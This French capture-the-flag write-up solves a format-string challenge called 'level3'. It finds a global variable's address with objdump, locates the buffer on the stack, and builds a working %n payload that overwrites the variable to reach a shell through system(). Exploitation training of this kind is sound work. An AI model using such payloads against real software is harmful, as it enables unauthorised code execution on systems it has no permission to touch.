# Level 3

![Ghidra level3, fonction main et v](./resources/ghidra-level3.png)

Nous avons une variable globale qui est `m`, cette variable est par défaut sur 0. L'objectif est de la modifier pour appeler le `system()`.

Nous pourrons le modifier grace à `printf` et avec la faille, pour cela nous avons besoin de l'adresse de `m`. nous utiliserons objdump et afficherons le symbol table.

```
$ objdump -t level3

level3:     file format elf32-i386

SYMBOL TABLE:
080484a4 g     F .text	00000076              v
0804983c g       .data	00000000              __data_start
00000000       F *UND*	00000000              system@@GLIBC_2.0
080483f0 g     F .text	00000000              _start
080485f8 g     O .rodata	00000004              _fp_hw
0804988c g     O .bss	00000004              m
08049880 g     O .bss	00000004              stdout@@GLIBC_2.0
```
Nous pourrons lancer le programme avec notre propre `format string` et afficher la mémoire de la stack. En commençant par trouver l'adresse / offset du paramètre.
```
$ echo "BBBB %x %x %x %x %x %x" | ./level3
BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825
```
Notre buffer "BBBB" est stocké en 4ème position dans la stack (B=42 "42424242")

Maintenant, nous devons changer cette adresse à l'adresse de la variable `m` ("0x804988c"), pour la changer après
```
$ python -c "print '\x8c\x98\x04\x08'+'%x %x %x %x'" | ./level3
�200 b7fd1ac0 b7ff37d0 804988c
```
OK bien. Nous allons maintenant utiliser le modificateur "%n" au lieu de "%x"

"%n" écrit dans l'adresse le nombre d'octets avant

Si nous faisons cela
```
$ python -c "print '\x8c\x98\x04\x08'+'%x %x %x %n'" | ./level3
```
Le nombre sera 4. Parce que notre buffer "\x8c\x98\x04\x08" est de 4 octets

On peut l'écrire comme ça pour mieux voir
```
$ python -c "print '\x8c\x98\x04\x08'+'%4$n'" | ./level3
```
Ce qui passe directement à la 4ème position et on n'est plus obligé de mettre les 3 autres "%x"

Maintenant, nous devons écrire 64 dans "m" pour passer la condition. Alors on ajoute juste 60 octets de plus
```
$ python -c 'print "\x8c\x98\x04\x08" + "B" * 60 + "%4$n"' | ./level3
�BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Wait what?!
```
Nous avons juste besoin de reouvrir l'entrée standard pour accéder au sh.
```
$ (python -c 'print "\x8c\x98\x04\x08"+"B"*60+"%4$n"'; cat -) | ./level3
```
